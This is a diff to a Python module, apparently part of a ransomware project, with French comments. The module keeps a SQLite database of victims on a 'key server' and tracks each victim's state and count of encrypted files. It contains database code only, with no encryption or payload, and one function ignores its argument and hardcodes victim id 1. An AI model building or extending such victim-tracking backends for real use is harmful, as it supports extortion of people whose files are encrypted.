@@ -6,18 +6,20 @@ DB_FILENAME = '../serveur_cles/data/victims.sqlite'
 
 def list_victim():
     # Connection DB
+    victim_list=[]
     conn = sqlite3.connect(DB_FILENAME)
     c = conn.cursor()
 
-    c.execute('SELECT id FROM victims')
+    c.execute('SELECT * FROM victims')
     # récupération des résultats
     rows = c.fetchall()
 
     # affichage des résultats
     for row in rows:
-        print(row)
+        victim_list += [row]
     conn.commit()
     conn.close()
+    return victim_list
 
 
 def insert_victim(victim):
@@ -41,6 +43,21 @@ def insert_victim(victim):
     conn.close()
 
 
+def history_req(victim_id):
+    # Connection DB
+    conn = sqlite3.connect(DB_FILENAME)
+    c = conn.cursor()
+
+    c.execute('SELECT s.id_victim, s.date_time, s.state, e.nb_files FROM states s LEFT JOIN encrypted e ON e.id_victim = s.id_victim WHERE s.id_victim = 1')
+    # récupération des résultats
+    rows = c.fetchall()
+
+    # affichage des résultats
+    for row in rows:
+        print(row)
+    conn.commit()
+    conn.close()
+
 def change_state(victim_id, state):
     # Connection DB
     conn = sqlite3.connect(DB_FILENAME)
@@ -56,6 +73,9 @@ def change_state(victim_id, state):
 
     conn.commit()
     conn.close()
+
+history_req(1)
+list_victim()
 
 '''
 # insert fake victims data
